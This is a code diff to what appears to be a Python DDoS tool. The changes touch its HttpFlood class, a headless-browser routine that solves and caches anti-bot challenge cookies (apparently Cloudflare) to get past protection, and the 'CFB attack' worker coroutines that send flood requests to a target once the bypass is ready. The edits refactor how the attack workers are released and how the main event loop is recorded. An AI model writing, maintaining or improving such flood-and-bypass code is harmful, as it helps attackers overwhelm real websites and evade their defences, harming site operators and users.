@@ -2232,12 +2232,7 @@ class BrowserEngine:
                         if probe_success:
                             logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Cached token is valid. Skipping solver.{bcolors.RESET}")
                             HttpFlood._active_solver = entry.get("solver_name", "Cache")
-                            try:
-                                import asyncio
-                                loop = asyncio.get_running_loop()
-                                loop.call_soon_threadsafe(_sm.bypass_ready_event.set)
-                            except RuntimeError:
-                                pass
+                            _sm.set_bypass_ready()
                             return entry["cookie"], entry["ua"]
                         else:
                             logger.info(f"{bcolors.WARNING}[!] Headless Recon: Cached token expired or invalid. Solving again...{bcolors.RESET}")
@@ -2273,12 +2268,7 @@ class BrowserEngine:
                 logger.debug(f"[*] Cache write error: {e}")
 
         if cookie:
-            try:
-                import asyncio
-                loop = asyncio.get_running_loop()
-                loop.call_soon_threadsafe(_sm.bypass_ready_event.set)
-            except RuntimeError:
-                pass
+            _sm.set_bypass_ready()
 
         return cookie, ua
 
@@ -5706,6 +5696,8 @@ def handleProxyList(con, proxy_arg, proxy_ty, url=None):
 
 
 async def main_async():
+    import src.core.state_manager as _sm
+    _sm.main_loop = asyncio.get_running_loop()
     try:
         loop = asyncio.get_event_loop()
         loop.set_default_executor(SYNC_EXECUTOR)
@@ -6237,7 +6229,10 @@ async def _cfb_send_request(target: str) -> None:
 async def _cfb_worker_task(target: str, stop_event: asyncio.Event) -> None:
     """CFB attack coroutine gated on bypass_ready_event."""
     while not stop_event.is_set():
-        await _sm.bypass_ready_event.wait()  # ← GATE
+        while not _sm.bypass_ready_event.is_set() and not stop_event.is_set():
+            await asyncio.sleep(0.1)
+        if stop_event.is_set():
+            break
         try:
             await _cfb_send_request(target)
         except Exception as e:
